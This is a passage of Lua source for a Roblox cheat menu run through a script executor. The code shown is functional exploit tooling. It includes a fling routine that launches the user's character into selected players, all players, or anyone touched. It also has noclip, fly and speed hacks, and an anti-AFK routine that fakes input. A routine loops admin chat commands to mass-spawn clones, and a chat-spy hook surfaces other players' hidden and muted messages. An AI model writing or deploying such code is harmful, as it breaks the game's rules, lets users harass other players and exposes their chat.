        or plr.Backpack:FindFirstChild("The Arkenstone") ~= nil
end

 function runStash(stashAmount)
    if stashRunning then
        Library:Notify("Stash already running!", 3)
        return
    end
    
    if not hasEnlighten() then
        Library:Notify("You need The Arkenstone (Enlighten) to stash!", 5)
        return
    end
    
    stashRunning = true
    stopStash = false
    
    task.spawn(function()
        local character = plr.Character
        if not character then 
            stashRunning = false
            return 
        end
        
        local hrp = character:FindFirstChild("HumanoidRootPart")
        if not hrp then 
            stashRunning = false
            return 
        end
        

        local originalCFrame = hrp.CFrame
        

        character:PivotTo(CFrame.new(stashPosition + Vector3.new(0, 30, 0)))
        task.wait(0.5)
        

        stashPlatform.CanCollide = true
        stashPlatform.Transparency = 0.9

        Library:Notify("Starting stash - DO NOT MOVE", 5)
        
        for i = 1, stashAmount do
            if stopStash then break end
            

             existingClones = 0
             cloneFolder = workspace:FindFirstChild("Clones")
            if cloneFolder and cloneFolder:FindFirstChild(plr.Name) then
                existingClones = #cloneFolder[plr.Name]:GetChildren()
            end
            
             col = existingClones % 4
             row = math.floor(existingClones / 4)
             offsetX = col * 10
             offsetZ = row * 10
            

            local clonePos = stashPosition + Vector3.new(offsetX, 0, offsetZ)
            character:PivotTo(CFrame.new(clonePos))
            task.wait(1)
            
            if stopStash then break end
            if not checkStash() then break end
            

            equipEnlighten(false)
            task.wait(0.3)
            

            if not equipBlueBucket() then
                sendGeneralChatMessage(";gear me 25162389")
                task.wait(1.5)
                equipBlueBucket()
                equipEnlighten(false)
            end
            
            if stopStash then break end
            if not checkStash() then break end
            

            sendGeneralChatMessage(";freeze me")
            task.wait(1)
            
            if stopStash then break end
            if not checkStash() then break end
            

            sendGeneralChatMessage(";clone me")
            task.wait(1)
            
            if stopStash then break end
            if not checkStash() then break end
            

            sendGeneralChatMessage(";unfreeze me")
            

            character:PivotTo(CFrame.new(clonePos + Vector3.new(0, 15, 0)))
            
            Library:Notify("Clone " .. i .. "/" .. stashAmount .. " created", 3)
            

            for _ = 1, 10 do
                task.wait(1)
                if stopStash then break end
                checkStash()
            end
        end
        

        task.wait(1)

         hum = character:FindFirstChildOfClass("Humanoid")
        if hum then
            hum:UnequipTools()
        end
        

        task.wait(0.5)
        hrp.CFrame = originalCFrame
        

        stashPlatform.CanCollide = false
        stashPlatform.Transparency = 1
        
        if stopStash then
            Library:Notify("Stash creation cancelled", 3)
        else
            Library:Notify("Stash complete! " .. stashAmount .. " clones created", 5)
        end
        
        stashRunning = false
        task.delay(3, function()
            stopStash = false
        end)
    end)
end

end -- /══ Stash System Core ══

do -- ══ Stash Management UI ══
 StashGroup = Tabs.StashSystem:CreateModule({Name = 'Stash Management'})

 StashAmount = StashGroup:CreateSlider({
    Name = 'Stash Clones',
    Default = 2,
    Min = 1,
    Max = 10,
    Increment = 0,
    Compact = false,
    Tooltip = 'Number of clones to create (Enlighten required)'
})

local _stashAmountGuard = false
StashAmount:OnChanged(function()
    if _stashAmountGuard then return end
    local cleanAmount = math.max(1, math.floor((tonumber(StashAmount.Value) or 1) + 0.5))
    if cleanAmount ~= StashAmount.Value then
        _stashAmountGuard = true
        StashAmount:SetValue(cleanAmount)
        _stashAmountGuard = false
    end
end)

StashGroup:CreateButton({
    Name = 'Create Stash',
    Function = function()
        runStash(math.max(1, math.floor((tonumber(StashAmount.Value) or 1) + 0.5)))
    end
})

StashGroup:CreateButton({
    Name = 'Stop Stash',
    Function = function()
        stopStash = true
        Library:Notify("Stopping stash...", 3)
    end
})

StashGroup:CreateButton({
    Name = 'Go to Stash',
    Function = function()
        local hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            hrp.CFrame = CFrame.new(stashPosition + Vector3.new(-20, 30, -20))
            Library:Notify("Teleported to stash area", 3)
        end
    end
})

StashGroup:CreateLabel({Text = 'Requires: Enlighten'})
StashGroup:CreateLabel({Text = 'Stash coords are randomised per session'})

 StashPlatform = Tabs.StashSystem:CreateModule({Name = 'Platform'})

StashPlatform:CreateButton({
    Name = 'Create Platform',
    Function = CreatePlatform
})

StashPlatform:CreateButton({
    Name = 'Clear Platform',
    Function = ClearPlatform
})

StashPlatform:CreateButton({
    Name = 'Enable Stash Platform',
    Function = function()
        stashPlatform.CanCollide = true
        stashPlatform.Transparency = 0.9
        Library:Notify("Stash platform enabled", 3)
    end
})

StashPlatform:CreateButton({
    Name = 'Disable Stash Platform',
    Function = function()
        stashPlatform.CanCollide = false
        stashPlatform.Transparency = 1
        Library:Notify("Stash platform disabled", 3)
    end
})

 PlayerToolsGroup = Tabs.StashSystem:CreateModule({Name = 'Player Management'})

 SpecificPlayerInput = PlayerToolsGroup:CreateTextBox({
    Default = '',
    Name = 'Specific Player:',
    PlaceholderText = 'Enter player username',
    Tooltip = 'Target specific player by name (overrides dropdown)'
})

PlayerTargetDropdown = PlayerToolsGroup:CreateDropdown({
    List = {'all', 'others', 'me', 'random'},
    Default = 1,
    Name = 'Target Mode:',
    Tooltip = 'Used when Specific Player is empty'
})

local function _disconnectTouchFlingPartConns()
    for i, conn in ipairs(_touchFlingPartConns) do
        pcall(function()
            conn:Disconnect()
        end)
        _touchFlingPartConns[i] = nil
    end
end

local function _trimFlingQuery(value)
    return tostring(value or ""):gsub("^%s+", ""):gsub("%s+$", "")
end

local function _getFlingState(targetPlayer)
    local targetChar = targetPlayer and targetPlayer.Character
    if not targetChar then return nil end

    local targetHum = targetChar:FindFirstChildOfClass("Humanoid")
    if not targetHum or targetHum.Health <= 0 then return nil end

    local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
        or targetChar:FindFirstChild("UpperTorso")
        or targetChar:FindFirstChild("Torso")
        or targetChar.PrimaryPart
    if not targetRoot or not targetRoot:IsA("BasePart") then return nil end

    return targetChar, targetHum, targetRoot
end

local function _cleanupFlingCharacter(character, humanoid, previousCollide, savedPivot, savedAutoRotate)
    for _, mover in ipairs(character and character:GetDescendants() or {}) do
        if mover:IsA("BodyVelocity") and mover.Name == "pealzwareFlingDrive" then
            pcall(function() mover:Destroy() end)
        elseif mover:IsA("BodyAngularVelocity") and (mover.Name == "pealzwareFlingSpin" or mover.Name == "pealzwareSelfFlingSpin") then
            pcall(function() mover:Destroy() end)
        end
    end

    for part, canCollide in pairs(previousCollide or {}) do
        if part and part.Parent then
            pcall(function()
                part.CanCollide = canCollide
            end)
        end
    end

    local _, _, root = _getFlingState(plr)
    if root then
        pcall(function()
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
        end)
    end

    if humanoid and humanoid.Parent then
        pcall(function()
            humanoid.AutoRotate = savedAutoRotate
            humanoid.PlatformStand = false
        end)
    end

    if character and character.Parent and savedPivot then
        pcall(function()
            character:PivotTo(savedPivot)
        end)
    end

    _flingInProgress = false
end

local function _selfFlingBurst()
    local myChar, myHum, myRoot = _getFlingState(plr)
    if not myRoot then
        return false, "Your character is not ready"
    end

    local cleanup = {}
    local ok, err = pcall(function()
        _flingInProgress = true
        pcall(function() plr.SimulationRadius = math.huge end)
        if myHum then
            myHum.Sit = false
            myHum.PlatformStand = false
        end

        local spin = Instance.new("BodyAngularVelocity")
        spin.Name = "pealzwareSelfFlingSpin"
        spin.MaxTorque = Vector3.new(1e9, 1e9, 1e9)
        spin.P = 1e9
        spin.AngularVelocity = Vector3.new(45000, 45000, 45000)
        spin.Parent = myRoot
        table.insert(cleanup, spin)

        local burst = Instance.new("BodyVelocity")
        burst.Name = "pealzwareFlingDrive"
        burst.MaxForce = Vector3.new(1e9, 1e9, 1e9)
        burst.P = 1e9
        burst.Velocity = myRoot.CFrame.LookVector * 320 + Vector3.new(0, 220, 0)
        burst.Parent = myRoot
        table.insert(cleanup, burst)

        if myHum then
            myHum:ChangeState(Enum.HumanoidStateType.Jumping)
        end

        task.wait(0.22)
    end)

    for _, mover in ipairs(cleanup) do
        pcall(function() mover:Destroy() end)
    end
    if myRoot and myRoot.Parent then
        pcall(function()
            myRoot.AssemblyLinearVelocity = Vector3.zero
            myRoot.AssemblyAngularVelocity = Vector3.zero
        end)
    end
    _flingInProgress = false

    return ok, err
end

local function _flingPlayerInstant(targetPlayer)
    if not targetPlayer then
        return false, "No target selected"
    end

    if targetPlayer == plr then
        return _selfFlingBurst()
    end

    local myChar, myHum, myRoot = _getFlingState(plr)
    if not myRoot or not myHum then
        return false, "Your character is not ready"
    end

    local targetChar, targetHum, targetRoot = _getFlingState(targetPlayer)
    if not targetRoot or not targetHum then
        return false, targetPlayer.Name .. " is not available"
    end

    local savedPivot = myChar:GetPivot()
    local savedAutoRotate = myHum.AutoRotate
    local previousCollide = {}
    local offsets = {
        Vector3.new(0, 2.8, 0.9),
        Vector3.new(2.9, 1.4, 0),
        Vector3.new(-2.9, 1.4, 0),
        Vector3.new(0, 1.4, 2.9),
        Vector3.new(0, 1.4, -2.9),
        Vector3.new(0, -2.3, 1.2),
        Vector3.new(0, 4.1, -1.2),
        Vector3.new(2.2, -1.2, 2.2),
    }

    local ok, err = pcall(function()
        _flingInProgress = true
        pcall(function() plr.SimulationRadius = math.huge end)
        myHum.Sit = false
        myHum.PlatformStand = false
        myHum.AutoRotate = false

        for _, part in ipairs(myChar:GetDescendants()) do
            if part:IsA("BasePart") then
                previousCollide[part] = part.CanCollide
                part.CanCollide = true
            end
        end

        local spin = Instance.new("BodyAngularVelocity")
        spin.Name = "pealzwareFlingSpin"
        spin.MaxTorque = Vector3.new(1e9, 1e9, 1e9)
        spin.P = 1e9
        spin.AngularVelocity = Vector3.new(45000, 45000, 45000)
        spin.Parent = myRoot

        local drive = Instance.new("BodyVelocity")
        drive.Name = "pealzwareFlingDrive"
        drive.MaxForce = Vector3.new(1e9, 1e9, 1e9)
        drive.P = 1e9
        drive.Velocity = Vector3.zero
        drive.Parent = myRoot

        local startedAt = tick()
        local idx = 1
        while tick() - startedAt < 0.6 do
            targetChar, targetHum, targetRoot = _getFlingState(targetPlayer)
            if not targetRoot or not targetHum then break end

            local targetPos = targetRoot.Position + (targetRoot.AssemblyLinearVelocity * 0.03)
            local offset = offsets[idx]
            idx = idx + 1
            if idx > #offsets then idx = 1 end

            myChar:PivotTo(CFrame.new(targetPos + offset, targetPos))
            drive.Velocity = (targetRoot.CFrame.LookVector * 220) + Vector3.new(0, 150, 0)
            myRoot.AssemblyAngularVelocity = Vector3.new(45000, 45000, 45000)
            myHum:ChangeState(Enum.HumanoidStateType.Physics)
            RunService.Heartbeat:Wait()
        end
    end)

    _cleanupFlingCharacter(myChar, myHum, previousCollide, savedPivot, savedAutoRotate)
    return ok, err
end

local function _bindTouchFlingPart(part)
    if not part or not part:IsA("BasePart") then return end

    table.insert(_touchFlingPartConns, part.Touched:Connect(function(hit)
        if not _touchFlingEnabled or _flingInProgress then return end
        if not hit or not hit.Parent then return end

        local hitModel = hit:FindFirstAncestorOfClass("Model")
        local hitPlayer = hitModel and Players:GetPlayerFromCharacter(hitModel)
        if not hitPlayer or hitPlayer == plr then return end

        local now = tick()
        local lastHit = _touchFlingDebounce[hitPlayer.UserId]
        if lastHit and (now - lastHit) < 0.9 then return end
        _touchFlingDebounce[hitPlayer.UserId] = now

        task.spawn(function()
            local ok = select(1, _flingPlayerInstant(hitPlayer))
            if ok then
                Library:Notify("Touch flung: " .. hitPlayer.Name, 2)
            end
        end)
    end))
end

PlayerToolsGroup:CreateButton({
    Name = 'Execute Fling',
    Function = function()
        local specificName = _trimFlingQuery(SpecificPlayerInput and SpecificPlayerInput.Value or "")
        local targetMode = tostring(PlayerTargetDropdown and PlayerTargetDropdown.Value or "all"):lower()
        local targets = specificName ~= "" and GetPlayerFromString(specificName) or GetPlayerFromString(targetMode)

        if not targets or #targets == 0 then
            Library:Notify(
                specificName ~= "" and ("Player not found: " .. specificName) or ("No players found for " .. targetMode),
                3
            )
            return
        end

        local flingCount = 0
        local lastError = nil

        for _, targetPlayer in ipairs(targets) do
            local ok, err = _flingPlayerInstant(targetPlayer)
            if ok then
                flingCount = flingCount + 1
            else
                lastError = err
            end

            if flingCount < #targets then
                task.wait(0.05)
            end
        end

        if flingCount > 0 then
            if #targets == 1 then
                Library:Notify("Fling landed on " .. targets[1].Name, 2)
            else
                Library:Notify("Fling fired on " .. tostring(flingCount) .. " player(s)", 3)
            end
        elseif lastError then
            Library:Notify(lastError, 3)
        end
    end
})

local function _setupTouchFling()
    if _touchFlingConn then _touchFlingConn:Disconnect(); _touchFlingConn = nil end
    _disconnectTouchFlingPartConns()
    _touchFlingDebounce = {}
    if not _touchFlingEnabled then return end
    local _char = plr.Character
    if not _char then return end

    for _, descendant in ipairs(_char:GetDescendants()) do
        if descendant:IsA("BasePart") then
            _bindTouchFlingPart(descendant)
        end
    end

    _touchFlingConn = _char.DescendantAdded:Connect(function(descendant)
        if _touchFlingEnabled and descendant:IsA("BasePart") then
            _bindTouchFlingPart(descendant)
        end
    end)
end
trackScriptConnection(plr.CharacterAdded:Connect(function()
    if _touchFlingEnabled then task.delay(0.5, _setupTouchFling) end
end))

antiAfkEnabled = false
antiAfkConnection = nil
antiAfkWindowFocusConn = nil
antiAfkPanel = nil
antiAfkFocusThread = nil
antiAfkUiThread = nil
local antiAfkStartedAt = 0
local antiAfkSystemRemote = nil

local function _formatAntiAfkElapsed(totalSeconds)
    totalSeconds = math.max(0, math.floor(totalSeconds or 0))
    local hours = math.floor(totalSeconds / 3600)
    local minutes = math.floor((totalSeconds % 3600) / 60)
    local seconds = totalSeconds % 60
    return string.format("%02d:%02d:%02d", hours, minutes, seconds)
end

local function _ensureAntiAfkPanel()
    if antiAfkPanel and antiAfkPanel.gui and antiAfkPanel.gui.Parent then
        return antiAfkPanel
    end

    antiAfkPanel = createToolPanel({
        name = "RomazAntiAfkPanel",
        title = "Anti-AFK Monitor",
        size = UDim2.new(0, 244, 0, 152),
        position = UDim2.new(0.09, 0, 0.13, 0),
        anchor = Vector2.new(0, 0),
        statusText = "Idle shield offline",
    })
    Library:MakeDraggable(antiAfkPanel.outer, 24)

    local accentGlow = Library:Create('Frame', {
        AnchorPoint = Vector2.new(0.5, 0);
        BackgroundColor3 = Library.Palette.AccentColor;
        BackgroundTransparency = 0.82;
        BorderSizePixel = 0;
        Position = UDim2.new(0.5, 0, 0.10, 0);
        Size = UDim2.new(0.84, 0, 0, 22);
        ZIndex = 4;
        Parent = antiAfkPanel.frame;
    })
    Library:Create('UICorner', { CornerRadius = UDim.new(0, 999); Parent = accentGlow })
    antiAfkPanel._accentGlow = accentGlow

    local statusPill = createToolLabel(antiAfkPanel.frame, "Shield: OFFLINE", 0.10)
    statusPill.TextXAlignment = Enum.TextXAlignment.Center
    statusPill.TextColor3 = Color3.fromRGB(255, 235, 168)
    statusPill.BackgroundTransparency = 0.12
    statusPill.BackgroundColor3 = Color3.fromRGB(33, 39, 56)
    antiAfkPanel.statusPill = statusPill

    antiAfkPanel.timerLabel = createToolLabel(antiAfkPanel.frame, "Elapsed: 00:00:00", 0.30)
    antiAfkPanel.pingLabel = createToolLabel(antiAfkPanel.frame, "Ping: 0 ms", 0.44)
    antiAfkPanel.fpsLabel = createToolLabel(antiAfkPanel.frame, "FPS: 0", 0.58)
    antiAfkPanel.focusLabel = createToolLabel(antiAfkPanel.frame, "Focus heartbeat: every 5s", 0.72)

    local disableBtn = createToolButton(antiAfkPanel.frame, "Disable", 0.84, 0.05, 0.90, function()
        antiAfkEnabled = false
        if antiAfkConnection then
            antiAfkConnection:Disconnect()
            antiAfkConnection = nil
        end
        if antiAfkWindowFocusConn then
            antiAfkWindowFocusConn:Disconnect()
            antiAfkWindowFocusConn = nil
        end
        if antiAfkPanel and antiAfkPanel.gui then
            antiAfkPanel.gui.Enabled = false
        end
        if antiAfkPanel and antiAfkPanel.status then
            antiAfkPanel.status.Text = "Idle shield offline"
        end
        Library:Notify("Anti-AFK disabled", 3)
    end)
    antiAfkPanel.disableButton = disableBtn

    antiAfkPanel.gui.Enabled = false
    return antiAfkPanel
end

local function setAntiAfkEnabled(enabled)
    antiAfkEnabled = enabled == true

    if antiAfkConnection then
        antiAfkConnection:Disconnect()
        antiAfkConnection = nil
    end
    if antiAfkWindowFocusConn then
        antiAfkWindowFocusConn:Disconnect()
        antiAfkWindowFocusConn = nil
    end

    local panel = _ensureAntiAfkPanel()
    panel.gui.Enabled = antiAfkEnabled

    if not antiAfkEnabled then
        panel.statusPill.Text = "Shield: OFFLINE"
        panel.status.Text = "Idle shield offline"
        panel.focusLabel.Text = "Focus heartbeat: stopped"
        return
    end

    antiAfkStartedAt = tick()
    antiAfkSystemRemote = ReplicatedStorage:FindFirstChild("System") or ReplicatedStorage:WaitForChild("System", 2)

    local virtualUser = game:GetService("VirtualUser")
    antiAfkConnection = game:GetService("Players").LocalPlayer.Idled:Connect(function()
        pcall(function()
            virtualUser:CaptureController()
            virtualUser:ClickButton2(Vector2.new())
        end)
    end)

    antiAfkWindowFocusConn = UserInputService.WindowFocusReleased:Connect(function()
        if antiAfkEnabled and antiAfkSystemRemote then
            pcall(function()
                antiAfkSystemRemote:FireServer("Focused")
            end)
        end
    end)

    antiAfkUiThread = task.spawn(function()
        while antiAfkEnabled and antiAfkPanel and antiAfkPanel.gui and antiAfkPanel.gui.Parent and not Library.Unloaded do
            antiAfkPanel.statusPill.Text = "Shield: ACTIVE"
            antiAfkPanel.timerLabel.Text = "Elapsed: " .. _formatAntiAfkElapsed(tick() - antiAfkStartedAt)
            antiAfkPanel.pingLabel.Text = "Ping: " .. tostring(math.max(0, math.floor(ping or 0))) .. " ms"
            antiAfkPanel.fpsLabel.Text = "FPS: " .. tostring(math.max(0, math.floor(FPS or 0)))
            antiAfkPanel.focusLabel.Text = antiAfkSystemRemote and "Focus heartbeat: every 5s" or "Focus heartbeat: remote missing"
            antiAfkPanel.status.Text = "Idle clicks armed • stats refresh every 1s"
            task.wait(1)
        end
    end)

    antiAfkFocusThread = task.spawn(function()
        while antiAfkEnabled and not Library.Unloaded do
            if antiAfkSystemRemote then
                pcall(function()
                    antiAfkSystemRemote:FireServer("Focused")
                end)
            end
            task.wait(5)
        end
    end)
end

PlayerToolsGroup:CreateButton({
    Name = 'Anti-AFK',
    Function = function()
        setAntiAfkEnabled(not antiAfkEnabled)
        Library:Notify(antiAfkEnabled and "Anti-AFK enabled" or "Anti-AFK disabled", 3)
    end
})


PlayerToolsGroup:CreateToggle({
    Name = 'Touch Fling',
    Default = false,
    Tooltip = 'Flings any player you physically touch'
}):OnChanged(function(val)
    _touchFlingEnabled = val
    _setupTouchFling()
end)

end -- /══ Stash Management UI ══

do -- ══ Character Control ══
CharacterGroup = Tabs.StashSystem:CreateModule({Name = 'Character Control'})

WalkSpeed = CharacterGroup:CreateSlider({
    Name = 'Walk Speed',
    Default = 16,
    Min = 16,
    Max = 100,
    Increment = 1,
    Compact = false,
    Tooltip = 'Set your character walk speed'
})

JumpPower = CharacterGroup:CreateSlider({
    Name = 'Jump Power',
    Default = 50,
    Min = 50,
    Max = 100,
    Increment = 1,
    Compact = false,
    Tooltip = 'Set your character jump power'
})

FlyEnabled = CharacterGroup:CreateToggle({
    Name = 'Toggle Fly',
    Default = false,
    Tooltip = 'Toggle flying mode'
})

FlySpeed = CharacterGroup:CreateSlider({
    Name = 'Fly Speed',
    Default = 50,
    Min = 10,
    Max = 200,
    Increment = 1,
    Compact = false,
    Tooltip = 'Set flying speed'
})

local _charStatsReady = false
local function applyCharacterStats()
    if not _charStatsReady then return end
    local character = plr.Character
    if not character then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    humanoid.WalkSpeed = WalkSpeed.Value
    pcall(function() humanoid.JumpPower = JumpPower.Value end)
    pcall(function() humanoid.JumpHeight = JumpPower.Value * 0.56 end)
end

WalkSpeed:OnChanged(applyCharacterStats)
JumpPower:OnChanged(applyCharacterStats)

CharacterGroup:CreateButton({
    Name = 'Reset Character',
    Function = function()
        if plr.Character then
            plr.Character:BreakJoints()
        end
    end
})

local NoclipBtn
NoclipBtn = CharacterGroup:CreateButton({
    Name = 'Noclip: OFF',
    Function = function()
        noclipEnabled = not noclipEnabled
        if noclipEnabled then
            NoclipBtn:SetText('Noclip: ON')
            noclipConn = RunService.Stepped:Connect(function()
                if not plr.Character then return end
                for _, part in ipairs(plr.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end)
        else
            NoclipBtn:SetText('Noclip: OFF')
            if noclipConn then noclipConn:Disconnect(); noclipConn = nil end
            if plr.Character then
                for _, part in ipairs(plr.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = true
                    end
                end
            end
        end
    end
})

CharacterGroup:CreateButton({
    Name = 'Go to Spawn',
    Function = function()
        local character = plr.Character
        if not character then 
            Library:Notify("Character not found", 3)
            return 
        end
        
        local hrp = character:FindFirstChild("HumanoidRootPart")
        if not hrp then
            Library:Notify("HumanoidRootPart not found", 3)
            return
        end
        
        local spawn = workspace:FindFirstChild("Spawn") or 
                     workspace:FindFirstChild("SpawnPoint") or
                     workspace:FindFirstChild("spawn") or
                     workspace:FindFirstChildOfClass("SpawnPoint")
        
        if spawn then
            local spawnPosition
            if spawn:IsA("Part") then
                spawnPosition = spawn.Position + Vector3.new(0, 5, 0)
            elseif spawn:IsA("Model") then
                local primaryPart = spawn.PrimaryPart or spawn:FindFirstChildWhichIsA("BasePart")
                if primaryPart then
                    spawnPosition = primaryPart.Position + Vector3.new(0, 5, 0)
                end
            end
            
            if spawnPosition then
                hrp.CFrame = CFrame.new(spawnPosition)
                Library:Notify("Teleported to spawn", 3)
                return
            end
        end
        
        local fallbackSpawn = Vector3.new(0, 100, 0)
        hrp.CFrame = CFrame.new(fallbackSpawn)
        Library:Notify("Teleported to default spawn area", 3)
    end
})

end -- /══ Character Control ══

do -- ══ Stash Settings ══
local StashSettingsGroup = Tabs.StashSystem:CreateModule({Name = 'Stash Settings'})
local StashXLabel = StashSettingsGroup:CreateLabel({Text = 'X: ' .. math.floor(stashPosition and stashPosition.X or 0)})
local StashYLabel = StashSettingsGroup:CreateLabel({Text = 'Y: ' .. math.floor(stashPosition and stashPosition.Y or 0)})
local StashZLabel = StashSettingsGroup:CreateLabel({Text = 'Z: ' .. math.floor(stashPosition and stashPosition.Z or 0)})

local function _updateStashLabels()
    if not stashPosition then return end
    pcall(function() StashXLabel:SetText('X: ' .. math.floor(stashPosition.X)) end)
    pcall(function() StashYLabel:SetText('Y: ' .. math.floor(stashPosition.Y)) end)
    pcall(function() StashZLabel:SetText('Z: ' .. math.floor(stashPosition.Z)) end)
end

StashSettingsGroup:CreateButton({
    Name = 'Reroll Stash Position',
    Function = function()
        stashPosition = Vector3.new(
            math.random(5000, 10000) * (math.random(2) == 1 and 1 or -1),
            math.random(1000, 3000),
            math.random(5000, 10000) * (math.random(2) == 1 and 1 or -1)
        )
        getgenv().stashposition = stashPosition
        if stashPlatform then
            pcall(function() stashPlatform.CFrame = CFrame.new(stashPosition - Vector3.new(0, 10, 0)) end)
        end
        _updateStashLabels()
        Library:Notify('Stash position rerolled', 3)
    end
})

StashSettingsGroup:CreateButton({
    Name = 'Copy Stash Coords',
    Function = function()
        if setclipboard and stashPosition then
            setclipboard(tostring(math.floor(stashPosition.X)) .. ', ' .. tostring(math.floor(stashPosition.Y)) .. ', ' .. tostring(math.floor(stashPosition.Z)))
            Library:Notify('Stash coords copied to clipboard', 3)
        end
    end
})
end -- /══ Stash Settings ══

do -- ══ Chat Utility & Spy ══
 ChatGroup = Tabs.Chat:CreateModule({Name = 'Chat Utility'})

 ChatSpyEnabled = false
 chatSpyConnection = nil

ChatSpyToggle = ChatGroup:CreateToggle({
    Name = 'Enable Chat Spy',
    Default = false,
    Tooltip = 'See all chat messages including private ones'
})

local ChatModsEnabled = false
local namecolors = {
    peasant = {150, 103, 102},
    arken = {4, 175, 236},
    admin = {245, 205, 48},
    hidden = {255, 0, 0},
    iqgenius = {255, 179, 179},
    iqdumb = {200, 0, 0}
}

local namecolorshex = {}
for i, v in pairs(namecolors) do
    namecolorshex[i] = "#" .. Color3.fromRGB(table.unpack(v)):ToHex()
end

local joincmds = {
    joinxl = "JoinXL",
    joinvc = "JoinVC",
    joinog = "JoinOG"
}

local originalOnIncomingMessage
local chatSpySetupDone = false
chatSpyChildAddedConn = nil
chatSpyChannelConnections = {}
local chatSpySeenMessages = {}
local chatSpyGlobalConn = nil
local chatSpyLegacyConn = nil

local function escapeRichText(str)
    str = tostring(str or "")
    str = str:gsub("&", "&amp;")
    str = str:gsub("<", "&lt;")
    str = str:gsub(">", "&gt;")
    return str
end

local function getChatSpyMeta(messagePlayer, rawText)
    local colorName = "peasant"
    if messagePlayer and messagePlayer.Neutral ~= true then
        colorName = "admin"
    elseif messagePlayer and messagePlayer:GetAttribute("Arken") == true then
        colorName = "arken"
    end

    local hidden = string.sub(rawText or "", 1, 1) == ";"
    local muted = false
    pcall(function()
        if not messagePlayer then return end
        muted = messagePlayer:GetAttribute("Muted") == true
            or CollectionService:HasTag(messagePlayer, "Muted")
            or (messagePlayer.HasTag and messagePlayer:HasTag("Muted"))
    end)
    if hidden or muted then
        colorName = "hidden"
    end

    local iq = nil
    if messagePlayer and messagePlayer:GetAttribute("IQ") then
        if messagePlayer:GetAttribute("IQ") >= 200 then
            iq = "genius \u{1F9E0}"
            colorName = "iqgenius"
        elseif messagePlayer:GetAttribute("IQ") <= 50 then
            iq = "dumb \u{1F92A}"
            colorName = "iqdumb"
        end
    end

    local extras = (hidden and " (HIDDEN CHAT)" or "") .. (iq and (" (" .. iq .. ")") or "") .. (muted and " (MUTED)" or "")
    return colorName, extras
end

function setupEnhancedChatSpy()
    if chatSpySetupDone then return end
    chatSpySetupDone = true

    pcall(function()
        if game.TextChatService.OnIncomingMessage then
            originalOnIncomingMessage = game.TextChatService.OnIncomingMessage
        end
    end)

    local _incomingHookOk = pcall(function()
        game.TextChatService.OnIncomingMessage = function(mdata)
        local baseProps = nil
        if originalOnIncomingMessage then
            local ok, result = pcall(originalOnIncomingMessage, mdata)
            if ok then
                baseProps = result
            end
        end

        local textSource = mdata and mdata.TextSource
        local sourcePlayer = textSource and Players:GetPlayerByUserId(textSource.UserId)
        if not sourcePlayer then
            return baseProps
        end

        local rawText = tostring(mdata.Text or "")
        local cmd = rawText:match("^;(%S+)") or rawText:match("^(%S+)") or ""
        if sourcePlayer == game.Players.LocalPlayer and joincmds[string.lower(cmd)] then
            for joinKey, joinGui in pairs(joincmds) do
                if game.Players.LocalPlayer.PlayerGui:FindFirstChild(joinGui) then
                    game.Players.LocalPlayer.PlayerGui[joinGui].Enabled = joinKey == string.lower(cmd)
                end
            end
        end

        if not ChatSpyEnabled then
            return baseProps
        end

        local colorName, extras = getChatSpyMeta(sourcePlayer, rawText)
        local rgb = namecolors[colorName] or namecolors.peasant
        local props = baseProps
        if not (typeof(props) == "Instance" and props:IsA("TextChatMessageProperties")) then
            props = Instance.new("TextChatMessageProperties")
        end
        props.PrefixText = "<i><font color='rgb(" .. rgb[1] .. "," .. rgb[2] .. "," .. rgb[3] .. ")'>(" .. escapeRichText(sourcePlayer.DisplayName) .. ")" .. escapeRichText(extras) .. " </font></i>"
        return props
        end
    end)
    if not _incomingHookOk then
        chatSpySetupDone = false
    end
end

dheads = {}
groups = {}

 function plradded(plr)
    local owner = false
    

    local groupInfo = nil
    for groupId, info in pairs(groups) do
        if plr:IsInGroup(groupId) then
            groupInfo = info
            break
        end
    end
    
    if owner or groupInfo then
         function onchar(c)
            if not c:FindFirstChild("Head") then return end
            
            local bbgui = Instance.new("BillboardGui")
            dheads[c.Head] = bbgui
            bbgui.Size = UDim2.new(10, 0, 1.5, 0)
            bbgui.StudsOffset = Vector3.new(0, 3.5, 0)
            bbgui.Parent = c.Head
            
            local txt = Instance.new("TextLabel")
            txt.TextScaled = true
            txt.BackgroundTransparency = 1
            txt.Size = UDim2.new(1, 0, 1, 0)
            txt.Position = UDim2.new(0, 0, -0.5, 0)
            txt.TextStrokeTransparency = 0
            
            local infotxt = Instance.new("TextLabel")
            infotxt.TextScaled = true
            infotxt.BackgroundTransparency = 1
            infotxt.Size = UDim2.new(1, 0, 0.5, 0)
            infotxt.Position = UDim2.new(0, 0, 0.5, 0)
            infotxt.TextStrokeTransparency = 0
            
            if owner then
                txt.Text = "Script Owner"
                infotxt.Text = "Special user"
                txt.TextColor3 = Color3.fromRGB(200, 90, 0)
            elseif groupInfo then
                txt.Text = groupInfo[1]
                txt.TextColor3 = groupInfo[2]
                infotxt.Text = plr:GetRoleInGroup(plr:GetRankInGroup(groupId))
            end
            
            txt.Parent = bbgui
            infotxt.TextColor3 = txt.TextColor3
            infotxt.Parent = bbgui
        end
        
        if plr.Character then
            onchar(plr.Character)
        end
        
        trackScriptConnection(plr.CharacterAdded:Connect(onchar))
    end
end

for _, player in ipairs(game.Players:GetPlayers()) do
    plradded(player)
end

trackScriptConnection(game.Players.PlayerAdded:Connect(plradded))

 function cleanupEnhancedChat()
    for head, gui in pairs(dheads) do
        if gui then
            gui:Destroy()
        end
    end
    dheads = {}
    
    if originalOnIncomingMessage then
        pcall(function()
            game.TextChatService.OnIncomingMessage = originalOnIncomingMessage
        end)
    end
    if chatSpyChildAddedConn then
        chatSpyChildAddedConn:Disconnect()
        chatSpyChildAddedConn = nil
    end
    if chatSpyGlobalConn then
        chatSpyGlobalConn:Disconnect()
        chatSpyGlobalConn = nil
    end
    if chatSpyLegacyConn then
        chatSpyLegacyConn:Disconnect()
        chatSpyLegacyConn = nil
    end
    for channel, conn in pairs(chatSpyChannelConnections) do
        if conn then
            conn:Disconnect()
        end
        chatSpyChannelConnections[channel] = nil
    end
    chatSpyConnection = nil
end


end -- /══ Chat Utility & Spy ══

